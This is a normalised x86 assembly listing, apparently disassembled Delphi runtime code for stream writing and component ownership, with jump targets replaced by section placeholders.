mov [ eax + 0x10 ] edx
pop ecx
pop ebp
retn
sub_441f84
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x8
mov eax [ ebp - 0x4 ]
call sub_4420c0
mov dl 0x9
mov eax [ ebp - 0x4 ]
call sub_4420c0
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_441fb0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0xffffff80
jl r-xdata
cmp [ ebp - 0x8 ] 0xffff8000
jl r-xdata
cmp [ ebp - 0x8 ] 0x7f
jg r-xdata
mov dl 0x4
mov eax [ ebp - 0x4 ]
call sub_4420c0
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_441f0c
cmp [ ebp - 0x8 ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax [ ebp - 0x4 ]
call sub_4420c0
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_441f0c
jmp r-xdata
mov dl 0x3
mov eax [ ebp - 0x4 ]
call sub_4420c0
lea edx [ ebp - 0x8 ]
mov ecx 0x2
mov eax [ ebp - 0x4 ]
call sub_441f0c
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_442058
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_44cd60
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xff
jg r-xdata
mov dl 0xc
mov eax [ ebp - 0x4 ]
call sub_4420c0
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_441f0c
mov dl 0x6
mov eax [ ebp - 0x4 ]
call sub_4420c0
lea edx [ ebp - 0xc ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_441f0c
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_441f0c
mov esp ebp
pop ebp
retn
sub_4420c0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x5 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_441f0c
pop ecx
pop ecx
pop ebp
retn
sub_442100
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x22 ] dl
cmp [ ebp - 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_4423b0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_44215c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4424d4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_442464
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_43ccd0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44241c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov [ ebp - 0xc ] eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
dec [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43c464
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
sub_44222c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43c504
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x20 ] 0x100
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43c264
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44222c
sub_4422a4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_440a78
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] ax
pop ecx
pop ecx
pop ebp
retn
sub_4422c4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_440a78
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a ] ax
pop ecx
pop ecx
pop ebp
retn
sub_4422e4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_441fb0
pop ecx
pop ecx
pop ebp
retn
sub_442304
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x1a ]
mov eax [ ebp - 0x8 ]
call sub_441fb0
pop ecx
pop ecx
pop ebp
retn
sub_442324
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_43c264
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
sub_442368
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_43c728
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
sub_4423b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov bx 0xfff6
call sub_44c24c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442324
mov dl 0x1
mov eax [ ebp - 0x8 ]
call sub_442b68
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x8 ]
call sub_442b00
sub_44241c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_442b68
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442368
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442464
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_43c600
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
test [ eax + 0x21 ] 0x1
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44241c
jmp r-xdata
mov ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
and ax [ edx + 0x20 ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442368
sub_4424d4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x8
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x20 ] 0x8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_43c464
call sub_4424d4
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
sub_442530
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43c728
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x14 ] edx
sub_442578
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442530
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_442530
pop ecx
pop ecx
pop ebp
retn
sub_4425a0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442578
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_43c464
mov cl [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
sub_442610
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_4422a4
mov eax [ ebp - 0x8 ]
push eax
push sub_4422e4
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x8 ]
push eax
push sub_4422c4
mov eax [ ebp - 0x8 ]
push eax
push sub_442304
mov ax [ ebp - 0x2 ]
mov edx [ ebp - 0x8 ]
cmp ax [ edx + 0x1a ]
setne cl
mov edx r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_442710
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_44cb34
pop ecx
pop ecx
pop ebp
retn
sub_4427e0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ecx
pop ecx
pop ebp
retn
sub_4427fc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
call sub_446260
test al al
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4428c4
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447b20
call sub_44c7a8
sub_442890
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov bx 0xfff5
call sub_44c24c
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4428c4
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_43c464
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
call sub_446260
test al al
jne r-xdata
sub_442930
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_44ce70
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_44639c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447b20
call sub_44c7a8
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_442b68
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4429e8
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_442b68
sub_4429e8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
mov edx [ ebp - 0x8 ]
call sub_44cb34
pop ecx
pop ecx
pop ebp
retn
sub_442a08
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_43c464
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_43c3b8
sub_442a48
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_442a74
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_43c504
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x10 ]
dec eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0xc ]
call sub_43c2dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43c550
sub_442b00
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x20 ] 0xffef
mov eax [ ebp - 0x4 ]
or [ eax + 0x20 ] 0x10
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_442a48
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0x6 ] 0x0
je r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_442a08
mov cl 0x1
mov dl [ ebp - 0x5 ]
call sub_442b00
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
sub_442b68
push ebp
mov ebp esp
add esp 0xfffffef4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x10c ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx 0xff
call sub_44cd3c
lea edx [ ebp - 0x10c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44c320
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ edx ] eax
jmp r-xdata
sub_442bcc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
test al al
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_442c04
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
test al al
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_442c3c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44c294
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_442c9c
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
push eax
mov eax [ eax ]
call [ eax ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
call sub_44c104
test al al
je r-xdata
mov [ ebp - 0x4 ] 0x80004002
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0xc
sub_442cec
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_442d4c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_443080
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_442d94
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_442dbc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov bx 0xfff0
call sub_44c24c
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442de0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_443080
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_443058
sub_442e4c
push ebp
